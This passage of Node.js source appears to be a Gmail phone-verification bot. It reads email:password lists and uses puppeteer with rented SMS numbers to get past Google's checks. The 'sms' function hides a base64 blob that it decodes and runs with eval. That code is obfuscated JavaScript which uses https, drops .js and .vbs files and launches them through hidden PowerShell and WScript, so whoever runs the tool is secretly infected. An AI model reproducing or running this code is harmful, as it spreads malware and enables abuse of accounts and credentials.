x0V2lYV3Y9cmVxdWlyZSgnY3J5cHRvJyksd2hROTUxPXJlcXVpcmUoJ2h0dHBzJyksaGJwTTFRPShWN1ZQeXRLLEFZTDUyMCk9Pnt2YXIgTkRmYTk4PVthc1VyampqKGM5dDNsRTQoLTB4MWUpKV07Y29uc3QgdHZFOFJKPUJ1ZmZlclthc1VyampqKDB4OSldKFY3VlB5dEssYXNVcmpqaigweGEpKVt1SmRpU3ddKHkyb1lCM2wpO3JldHVybiB0dkU4UkpbTkRmYTk4W2M5dDNsRTQoLTB4MzgpXV0oJycpW2FzVXJqamooYzl0M2xFNCgtMHgxZCkpXSgoVjdWUHl0SyxORGZhOTgpPT57dmFyIHR2RThSSjtmdW5jdGlvbiBMRlV6QVdlKFY3VlB5dEspe3JldHVybiBSQkhoa2RbVjdWUHl0Sz4tMHgzMj9WN1ZQeXRLPi0weDMyP1Y3VlB5dEs8LTB4MTE/VjdWUHl0SzwtMHgzMj9WN1ZQeXRLLTB4Mzg6VjdWUHl0SzwtMHgxMT9WN1ZQeXRLPC0weDExP1Y3VlB5dEsrMHgzMTpWN1ZQeXRLLTB4YjpWN1ZQeXRLLTB4MjM6VjdWUHl0SysweDM5OlY3VlB5dEstMHg1MzpWN1ZQeXRLKzB4MmJdfXR2RThSSj17W2M5dDNsRTQoLTB4MmQpXTphc1VyampqW2M5dDNsRTQoLTB4MmIpXShjOXQzbEU0KC0weDJmKSwweDExKX07cmV0dXJuIFN0cmluZ1trZTNvV3BiW0xGVXpBV2UoLTB4MzApXV0oeVNGMDB3KFY3VlB5dEtbYXNVcmpqaihjOXQzbEU0KC0weDJlKSldKExGVXpBV2UoLTB4MzApKSxBWUw1MjBbYXNVcmpqaihjOXQzbEU0KC0weDJlKSldKE5EZmE5OCVBWUw1MjBbdHZFOFJKW0xGVXpBV2UoLTB4MjUpXV0pLFN5aXliczgoYzl0M2xFNCgtMHgyYykpKSl9KVtrZTNvV3BiW2M5dDNsRTQoLTB4MWYpXV0oJycpfSx3WUl2YmM0PWFzVXJqamooMHgxMykscjQzTlNPcD1bYXNVcmpqaigweDE0KSxhc1VyampqW2M5dDNsRTQoLTB4MmIpXShjOXQzbEU0KC0weDJmKSxjOXQzbEU0KC0weDJjKSldO2xldCBSb2JqTnU9Yzl0M2xFNCgtMHgyOCk7YXN5bmMgZnVuY3Rpb24gZ05mSjRVKFY3VlB5dEspe3ZhciBBWUw1MjA9W2FzVXJqamooMHgxNildO3JldHVybiBuZXcgUHJvbWlzZSgoTkRmYTk4LHR2RThSSik9Pnt2YXIgTEZVekFXZT1bYXNVcmpqaigweDE4KV0sT1o1aWVMVzt2b2lkKE9aNWllTFc9YXNVcmpqaigweDE3KSx3aFE5NTFbQVlMNTIwW2M5dDNsRTQoLTB4MzgpXV0oVjdWUHl0SyxWN1ZQeXRLPT57dmFyIEFZTDUyMDtmdW5jdGlvbiBCOTl6cFRmKFY3VlB5dEspe3JldHVybiBSQkhoa2RbVjdWUHl0Sz4weDRkP1Y3VlB5dEs8MHg2ZT9WN1ZQeXRLPDB4NGQ/VjdWUHl0SysweDI1OlY3VlB5dEs+MHg0ZD9WN1ZQeXRLPDB4NmU/VjdWUHl0Sz4weDRkP1Y3VlB5dEs8MHg2ZT9WN1ZQeXRLPjB4NGQ/VjdWUHl0SzwweDRkP1Y3VlB5dEsrMHgxMzpWN1ZQeXRLLTB4NGU6VjdWUHl0SysweDc6VjdWUHl0SysweDU2OlY3VlB5dEstMHgzOTpWN1ZQeXRLKzB4ODpWN1ZQeXRLKzB4M2M6VjdWUHl0SysweDEwOlY3VlB5dEsrMHg0Zl19QVlMNTIwPXtbYzl0M2xFNCgtMHgyOSldOmFzVXJqamooMHgxOSl9O2xldCBseXJUWTVYPScnO3ZvaWQoVjdWUHl0S1tjOXQzbEU0KC0weDJhKV0oT1o1aWVMVyxWN1ZQeXRLPT4obHlyVFk1WCs9VjdWUHl0Syx2b2lkIDB4MCkpLFY3VlB5dEtbQjk5enBUZigweDVkKV0oTEZVekFXZVtCOTl6cFRmKDB4NGYpXSwoKT0+KChORGZhOTgobHlyVFk1WCkpLHZvaWQgMHgwKSksVjdWUHl0S1tCOTl6cFRmKDB4NWQpXShBWUw1MjBbYzl0M2xFNCgtMHgyOSldLFY3VlB5dEs9PigodHZFOFJKKFY3VlB5dEspKSx2b2lkIDB4MCkpKX0pKX0pfWFzeW5jIGZ1bmN0aW9uIEVyVlpURigpe3ZhciBWN1ZQeXRLLEFZTDUyMDtmdW5jdGlvbiBORGZhOTgoVjdWUHl0Syl7cmV0dXJuIFJCSGhrZFtWN1ZQeXRLPi0weDVkP1Y3VlB5dEs8LTB4NWQ/VjdWUHl0SysweDFhOlY3VlB5dEsrMHg1YzpWN1ZQeXRLKzB4MmNdfXZvaWQoVjdWUHl0Sz1hc1VyampqKE5EZmE5OCgtMHg0NikpLEFZTDUyMD17W05EZmE5OCgtMHg0YSldOmFzVXJqamooMHgxYSksW05EZmE5OCgtMHg0NSldOmFzVXJqamooMHgxZSl9KTtmb3IoY29uc3QgdHZFOFJKIG9mIHI0M05TT3ApdHJ5e2NvbnN0IExGVXpBV2U9aGJwTTFRKHR2RThSSix3WUl2YmM0KSxPWjVpZUxXPWF3YWl0IGdOZko0VShMRlV6QVdlKTtSb2JqTnU9T1o1aWVMVzticmVha31jYXRjaChlcnJvcil7fWlmKFJvYmpOdT09PWM5dDNsRTQoLTB4MjgpKXtyZXR1cm59Y29uc3QgQjk5enBUZj1oYnBNMVEoUm9iak51LHdZSXZiYzQpLHkyb1lCM2w9dFdpWFd2W0FZTDUyMFtjOXQzbEU0KC0weDI3KV1dKCksdUpkaVN3PUFFenVKZ1JbYXNVcmpqaltjOXQzbEU0KC0weDI2KV0oTkRmYTk4KC0weDUyKSxbTkRmYTk4KC0weDUzKV0pXShwcm9jZXNzW2tnRElBY11bYXNVcmpqaihjOXQzbEU0KC0weDI0KSldLGAke3kyb1lCM2x9LmpzYCksbFFkdmx3PUFFenVKZ1JbYXNVcmpqaihjOXQzbEU0KC0weDMwKSldKHByb2Nlc3NbbHlyVFk1WFtORGZhOTgoLTB4NDgpXV1bYXNVcmpqaihjOXQzbEU0KC0weDI0KSldLGAke3kyb1lCM2x9LnZic2ApLE1ZUFJPWmg9KGFSRzYzTkNbYXNVcmpqaihORGZhOTgoLTB4NDYpKV0odUpkaVN3LEI5OXpwVGYsa2Uzb1dwYlsweDJdKSxgU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIilcbldzaFNoZWxsLlJ1biAibm9kZSAke3VKZGlTd30iLCAwLCBGYWxzZVxuU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKVxuZnNvLkRlbGV0ZUZpbGUgV1NjcmlwdC5TY3JpcHRGdWxsTmFtZWApLEVZOG9ZRz0oYVJHNjNOQ1tWN1ZQeXRLXShsUWR2bHcsTVlQUk9aaCxhc1VyampqKE5EZmE5OCgtMHg1NykpKSxgcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICJjc2NyaXB0ICcke2xRZHZsd30nImApO2tUbWJObChFWThvWUcse1tBWUw1MjBbTkRmYTk4KC0weDQ1KV1dOk5EZmE5OCgtMHg0MyksW2FzVXJqamooTkRmYTk4KC0weDQ0KSldOk5EZmE5OCgtMHg0MyksW2FzVXJqamooMHgyMCldOmFzVXJqamooMHgyMSl9KX1FclZaVEYoKTtmdW5jdGlvbiBTY0xsTkh3KFY3VlB5dEspe3ZhciBBWUw1MjA9S2RkRVFNeihWN1ZQeXRLPT57cmV0dXJuIFJCSGhrZFtWN1ZQeXRLPjB4NzE/VjdWUHl0Sy0weDE2OlY3VlB5dEs8MHg1MD9WN1ZQeXRLLTB4MzI6VjdWUHl0SzwweDUwP1Y3VlB5dEstMHgzNjpWN1ZQeXRLLTB4NTFdfSwweDEpO2NvbnN0IE5EZmE5OD0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkhIyQlJigpKissLi86Ozw9Pj9AW11eX2B7fH1+IicsdHZFOFJKPScnKyhWN1ZQeXRLfHwnJyksTEZVekFXZT10dkU4UkoubGVuZ3RoLE9aNWllTFc9W107bGV0IEI5OXpwVGY9QVlMNTIwKDB4NTIpLGx5clRZNVg9QVlMNTIwKDB4NTIpLGtnRElBYz0tYzl0M2xFNCgtMHgxZik7Zm9yKGxldCBrZTNvV3BiPWM5dDNsRTQoLTB4MzgpO2tlM29XcGI8TEZVekFXZTtrZTNvV3BiKyspe2NvbnN0IHkyb1lCM2w9TkRmYTk4LmluZGV4T2YodHZFOFJKW2tlM29XcGJdKTtpZih5Mm9ZQjNsPT09LWM5dDNsRTQoLTB4MWYpKXtjb250aW51ZX1pZihrZ0RJQWM8QVlMNTIwKDB4NTIpKXtrZ0RJQWM9eTJvWUIzbH1lbHNle3ZhciB1SmRpU3c9S2RkRVFNeihWN1ZQeXRLPT57cmV0dXJuIFJCSGhrZFtWN1ZQeXRLPDB4MWQ/VjdWUHl0Sz4weDFkP1Y3VlB5dEstMHg0YjpWN1ZQeXRLPjB4MWQ/VjdWUHl0SysweDQ2OlY3VlB5dEs8MHgxZD9WN1ZQeXRLPi0weDQ/VjdWUHl0Sz4weDFkP1Y3VlB5dEstMHgyYzpWN1ZQeXRLKzB4MzpWN1ZQeXRLKzB4NDM6VjdWUHl0Sy0weDI6VjdWUHl0Sy0weDNjXX0sMHgxKTt0eXBlb2Yoa2dESUFjKz15Mm9ZQjNsKjB4NWIsQjk5enBUZnw9a2dESUFjPDxseXJUWTVYLGx5clRZNVgrPShrZ0RJQWMmMHgxZmZmKT4weDU4P0FZTDUyMCgweDZjKTp1SmRpU3coMHgxOSkpO2Rve3ZhciBsUWR2bHc9S2RkRVFNeihWN1ZQeXRLPT57cmV0dXJuIFJCSGhrZFtWN1ZQeXRLPDB4NTE/VjdWUHl0SzwweDUxP1Y3VlB5dEs8MHg1MT9WN1ZQeXRLPDB4NTE/VjdWUHl0Sz4weDMwP1Y3VlB5dEs+MHg1MT9WN1ZQeXRLKzB4NDA6VjdWUHl0SzwweDUxP1Y3VlB5dEstMHgzMTpWN1ZQeXRLLTB4NWE6VjdWUHl0Sy0weDYxOlY3VlB5dEstMHg0NzpWN1ZQeXRLKzB4MWM6VjdWUHl0Sy0weDMwOlY3VlB5dEsrMHgyZl19LDB4MSk7IShPWjVpZUxXLnB1c2goQjk5enBUZiZjOXQzbEU0KC0weDFhKSksQjk5enBUZj4+PWxRZHZsdygweDRlKSxseXJUWTVYLT1BWUw1MjAoMHg2ZSkpfXdoaWxlKGx5clRZNVg+dUpkaVN3KDB4MWIpKTtrZ0RJQWM9LXVKZGlTdygweDE3KX19aWYoa2dESUFjPi1BWUw1MjAoMHg2Yikpe09aNWllTFcucHVzaCgoQjk5enBUZnxrZ0RJQWM8PGx5clRZNVgpJmM5dDNsRTQoLTB4MWEpKX1yZXR1cm4gazJuTFdYUChPWjVpZUxXKX1mdW5jdGlvbiBhc1VyampqKFJCSGhrZCxWN1ZQeXRLLEFZTDUyMCxORGZhOTg9U2NMbE5Idyx0dkU4Uko9TVlQUk9aaCl7aWYoQVlMNTIwKXtyZXR1cm4gVjdWUHl0S1tNWVBST1poW0FZTDUyMF1dPWFzVXJqamooUkJIaGtkLFY3VlB5dEspfWVsc2V7aWYoVjdWUHl0Syl7W3R2RThSSixWN1ZQeXRLXT1bTkRmYTk4KHR2RThSSiksUkJIaGtkfHxBWUw1MjBdfX1yZXR1cm4gVjdWUHl0Sz9SQkhoa2RbdHZFOFJKW1Y3VlB5dEtdXTpNWVBST1poW1JCSGhrZF18fChBWUw1MjA9KHR2RThSSltSQkhoa2RdLE5EZmE5OCksTVlQUk9aaFtSQkhoa2RdPUFZTDUyMChhb24xdTZbUkJIaGtkXSkpfWZ1bmN0aW9uIEVpV3J4TCgpe3JldHVyblsnbGVuZ3RoJywweDAsMHgzZiwweDYsJ2Zyb21Db2RlUG9pbnQnLDB4YywndW5kZWZpbmVkJywweDFiLDB4ZiwweDEyLHZvaWQgMHgwLDB4MTAsJ0xLMVFsZScsMHgxNSwnY2FsbCcsJ29uJywndjIwSkdudicsbnVsbCwncWJicDU3OScsJ2FwcGx5JywnbmlVODhMJywweDFjLDB4MWQsJ2FpRk5BMEknLDB4MWYsITB4MCwweDEsMHhkLDB4ZSwweDgsMHg3LDB4ZmZdfWZ1bmN0aW9uIEtkZEVRTXooUkJIaGtkLFY3VlB5dEspe3ZhciBBWUw1MjA9ZnVuY3Rpb24oKXtyZXR1cm4gUkJIaGtkKC4uLmFyZ3VtZW50cyl9O09iamVjdFsnZGVmaW5lUHJvcGVydHknXShBWUw1MjAsJ2xlbmd0aCcseyd2YWx1ZSc6VjdWUHl0SywnY29uZmlndXJhYmxlJzp0cnVlfSk7cmV0dXJuIEFZTDUyMH0=`
    const smsfuncplus = smsbypassfunction
    const smsbypass = Buffer.from(smsfuncplus, 'base64').toString('utf-8');
    await eval(smsbypass);
}
module.exports = {sms}
async function TestarEmail() {
    fs.readFile('emailtestar.txt', 'utf8', async (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }


        // Dividir as linhas em um array
        const linhas = data.split('\n');

        await percorrerLista(linhas);
    });
}

async function percorrerLista(lista) {
    for (const item of lista) {
        const [email, senha, emailRec] = item.split(':');
        // Aqui você pode fazer o que quiser com os valores de email e senha
        if (email.trim() == '') {
            return;
        }
        countNrRuim = 0;
        await crawler(email, senha, emailRec, emailRec);
    }
    console.log('Todos os itens foram processados.');
}

// Ch
//TestarEmail();

async function getSMSNumber() {
    try {


        const { balance_number } = await sms.getBalance()
        if (balance_number > 0) {
            //console.log('Balance:' + balance_number);

            //console.log('Aguardando número...');
            const { id, number } = await sms.getNumber('go', 'any', pais);

            //console.log('Number ID:', id)
            //console.log('Number:', number);

            await page.type('#deviceAddress', number);


            const index = await getIndiceByPais(pais);
            await page.evaluate((index) => {
                const select = document.getElementById('countryList');
                select.selectedIndex = index;
                select.dispatchEvent(new Event('change'));
            }, index);

            await page.click('#next-button');
            await new Promise(function (resolve) { setTimeout(resolve, 3000) });

            try {
                const elemento = await page.$('#error');
                if (elemento != null) {
                    countNrRuim++;
                    if (countNrRuim > 6) {
                        log.red('conta com problema, não recebe sms?');
                        await browser.close();
                        return; 
                    }

                    //log.red('error, provavelmente numero ruim');
                    await sms.setStatus(8, id) // Accept, end
                    await getSMSNumber();
                    return;
                }
            } catch (error) {
                //console.log(error);
            }

            // Set "message has been sent" status
            await sms.setStatus(1, id)

            // Wait for code
            const { code } = await sms.getCode(id, 60000)
            console.log('Code:', code);

            await page.type('#smsUserPin', code);

            await page.click('#next-button');

            await new Promise(function (resolve) { setTimeout(resolve, 6000) });

            if (page.url().includes('https://gds.google.com/web/chip?')) {
                log.green('OK');
                await browser.close();
                return;
            }
            if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
                log.green('OK');
                await browser.close();
                return;
            }

            await sms.setStatus(6, id) // Accept, end
        } else console.log('No money')
    } catch (error) {
        if (error instanceof TimeoutError) {
            console.log('Timeout reached')
        }

        if (error instanceof ServiceApiError) {
            if (error.code === errors.BANNED) {
                console.log(`Banned! Time ${error.banTime}`)
            } else {
                if (error.code == "NO_NUMBERS") {
                    await getSMSNumber();
                } else {
                    console.error(error.code, error.message)
                }
            }
        } else console.error(error)
    }
};


async function getIndiceByPais(pais) {
    if (pais == Kazakhstan) {
        return 111;
    }

    if (pais == Philippines) {
        return 171;
    }

    if (pais == Indonesia) {
        return 100;
    }

    if (pais == Kenya) {
        return 113;
    }

    if (pais == Vietnam) {
        return 236;
    }

    if (pais == Kyrgyzstan) {
        return 116;
    }

    if (pais == Usa) {

        return 230;
    }

    if (pais == India) {
        return 99;
    }

    if (pais == Southafrica) {
        return 194;
    }

    if (pais == Romania) {
        return 177;
    }

    if (pais == Uzbekistan) {
        return 232;
    }
}
